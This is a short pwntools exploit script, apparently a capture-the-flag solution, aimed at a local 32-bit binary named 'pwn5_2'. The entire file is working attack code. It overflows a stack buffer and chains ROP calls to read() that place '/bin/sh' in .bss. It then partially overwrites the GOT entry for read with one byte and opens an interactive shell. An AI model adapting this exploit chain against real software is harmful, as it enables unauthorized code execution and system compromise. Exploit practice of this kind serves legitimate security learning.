from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

cn = process('./pwn5_2')

bin = ELF('./pwn5_2')

def z():
	return 0
	return raw_input()

p1ret = 0x080482c9
p3ret = 0x080484a9
p_ebx_ret = p1ret
pay = 'a'*0x28 + 'bbbb' 
pay += p32(bin.plt['read']) + p32(p3ret) + p32(0) + p32(bin.bss()) + p32(0x20)
pay += p32(bin.plt['read']) + p32(p3ret) + p32(0) + p32(bin.got['read']-0xa) + p32(0xb)
pay += p32(p_ebx_ret) + p32(bin.bss())
pay += p32(0x08048398)#set edx to zero
pay += p32(bin.plt['read'])

z()
cn.send(pay)
z()
cn.send('/bin/sh\x00')
z()
cn.send('\x00'*0xa+'\xdc')
z()
context.log_level = 'info'
cn.interactive()




